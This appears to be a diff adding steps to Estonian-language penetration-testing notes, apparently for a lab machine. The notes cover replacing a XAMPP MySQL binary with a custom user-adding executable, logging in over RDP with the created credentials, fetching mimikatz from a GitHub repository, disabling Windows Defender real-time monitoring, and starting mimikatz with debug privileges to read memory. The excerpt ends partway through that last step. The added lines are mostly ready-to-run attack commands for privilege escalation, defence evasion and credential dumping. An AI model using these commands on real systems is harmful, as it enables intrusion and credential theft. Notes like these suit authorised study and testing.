@@ -121,3 +121,9 @@ move C:\xampp\mysql\bin\mysql.exe oldmysql.exe Teeme originaalist backupi (see e
 move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe (asendame originaali meie custom failiga)
 Restart-Computer (Saadame masina restarti, et uus fail mällu laetaks)
 sudo xfreerdp3 /u:pentest /p:'kalasaba1.' /v:192.168.1.17 (Logime sisse uue kasutajaga mille skript tegi)
+Tõmbame mimikaz faili pentest kausta mida me jagame välja github.com/leppalintu/invoke_mimikaz
+Set-MpPreference -DisableRealtimeMonitoring $true (Keerame defenderi kinni admin powershellis)
+powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true" (sama asi läbi admin cmd)
+Käivitame mimikatzi (admin term)
+  privilege::debug (tõstame õigusi, et saaks lugeda mälu)
+  
